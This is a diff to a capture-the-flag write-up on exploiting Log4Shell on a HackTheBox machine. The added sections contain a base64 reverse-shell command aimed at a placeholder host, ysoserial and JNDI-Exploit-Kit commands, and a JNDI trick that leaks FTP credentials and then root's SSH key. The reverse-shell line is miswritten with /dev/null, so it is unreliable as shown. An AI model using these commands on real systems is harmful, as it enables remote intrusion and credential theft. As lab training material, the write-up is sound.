@@ -261,7 +261,7 @@ And now in the website we are going to upload the war file that we generate and 
 <img src = "/assets/images/img-logforge/captura22.png">
 </p>
 
-And we get a message that only 1 bytes war file can be uploaded, and with 1 byte war file we don't do a shit. And this is where the ***log4shell*** vulnerability comes in. 
+And we get a message that only 1 bytes war file can be uploaded, and with 1 byte war file we can't do a shit. And this is where the ***log4shell*** vulnerability comes in. 
 
 <p align = "center">
 <img src = "/assets/images/img-logforge/captura23.png">
@@ -322,6 +322,29 @@ So as u can see onece we press enter the payload is uploaded on the victim machi
 <p align = "center">
 <img src = "/assets/images/img-logforge/captura32.png">
 </p>
+
+## Second option to exploit the log4shell
+
+Another option to exploit the log4j, is first download the [JDNI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit) repo to have a ldap server and also the [ysoserial-modified](https://github.com/pimps/ysoserial-modified) repo to create a serialized data (so that our reverse shell command is serialized).
+
+Now we are going to generate a serialized paylod with tha payload type ***commonsCollections5*** if this does not work we try with the 4.
+
+```bash
+$ echo -n 'bash -i >& /dev/null/yourip/port 0>&1' | base64
+YmFzaCAtaSA+JiAvZGV2L251bGwveW91cmlwL3BvcnQgMD4mMQ==
+
+$ java -jar ysoserial-modified.jar CommonsCollections5 bash 'echo YmFzaCAtaSA+JiAvZGV2L251bGwveW91cmlwL3BvcnQgMD4mMQ== | base64 -d | bash' > payload.ser
+```
+
+Run the ldap server:
+
+```bash
+$ java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L yourip:1389 -P payload.ser
+```
+
+And we are going to do what we done before, which is to copy a jndi link and paste it in the tomcat page by listening in netcat.
+
+## Analyze the system once we have access
 
 The first thing when we have access in the machine is to launch a pseudo console and then ***ctrl + z*** and with the command ***stty raw -echo; fg*** to treat the tty, so that we can use ctrl + c, move comfortably in the remote machine.
 
@@ -431,7 +454,7 @@ Then as we have done before to check if it was running the log4j in the ftp serv
 <img src = "/assets/images/img-logforge/captura50.png">
 </p>
 
-Then in a real environment for example we can use canary tokens that behaves as a kind of public ldap server, instead of doing it in our own machine.
+In a real environment for example we can use canary tokens that behaves as a kind of public ldap server, instead of doing it in our own machine.
 
 <p align = "center">
 <img src = "/assets/images/img-logforge/captura51.png">
@@ -443,25 +466,51 @@ And instead of ***hostname*** we put the environment variable ***ftp_user***, an
 <img src = "/assets/images/img-logforge/captura52.png">
 </p>
 
+At this point what we ara going to do is an a another window run the ldap server as we have done before to exploit the log4shell, and when it asks for the username in the ftp service we are going to inject the jdni url and we will add the env variable (***$env:ftp_user***) because this env variable exists in the root user's env and that env variable stored the username. But the problem is that we can't see the information from our ldap server, what we are going to do is to capture those packets in wireshark.
 
 <p align = "center">
-<img src = "/assets/images/img-logforge/captura50.png">
-</p><p align = "center">
-<img src = "/assets/images/img-logforge/captura50.png">
-</p><p align = "center">
-<img src = "/assets/images/img-logforge/captura50.png">
-</p><p align = "center">
-<img src = "/assets/images/img-logforge/captura50.png">
-</p><p align = "center">
-<img src = "/assets/images/img-logforge/captura50.png">
-</p><p align = "center">
-<img src = "/assets/images/img-logforge/captura50.png">
-</p><p align = "center">
-<img src = "/assets/images/img-logforge/captura50.png">
-</p><p align = "center">
-<img src = "/assets/images/img-logforge/captura50.png">
-</p><p align = "center">
-<img src = "/assets/images/img-logforge/captura50.png">
-</p><p align = "center">
-<img src = "/assets/images/img-logforge/captura50.png">
+<img src = "/assets/images/img-logforge/captura53.png">
 </p>
+
+And once we hit enter, we capture the packets in wireshrak and in this case i am going to filter the port 1389 (ldap), and in this i have captured a packet and we see tha username.
+
+<p align = "center">
+<img src = "/assets/images/img-logforge/captura54.png">
+</p>
+
+We do the same process with the ***ftp_password*** variable.
+
+<p align = "center">
+<img src = "/assets/images/img-logforge/captura55.png">
+</p>
+
+And if we capture those packets in wireshark by filtering the port 1389 we can see the user's password.
+
+<p align = "center">
+<img src = "/assets/images/img-logforge/captura56.png">
+</p>
+
+And now once we have the credentials let's check if we have access, and as you can see we have access and we can visualize the last flag which is the ***root.txt***.
+
+<p align = "center">
+<img src = "/assets/images/img-logforge/captura57.png">
+</p>
+
+Get the ***root.txt*** and uploaded in the hackthebox website.
+
+<p align = "center">
+<img src = "/assets/images/img-logforge/captura58.png">
+</p>
+
+We can see an interesting directory that is shared in this ftp service, which is the ***.ssh*** and inside we can see the ***id_rsa*** file.
+
+<p align = "center">
+<img src = "/assets/images/img-logforge/captura59.png">
+</p>
+
+We download the ***id_rsa*** file and we get the ssh private key, which we can use to access as the root user with ssh.
+
+<p align = "center">
+<img src = "/assets/images/img-logforge/captura60.png">
+</p>
+
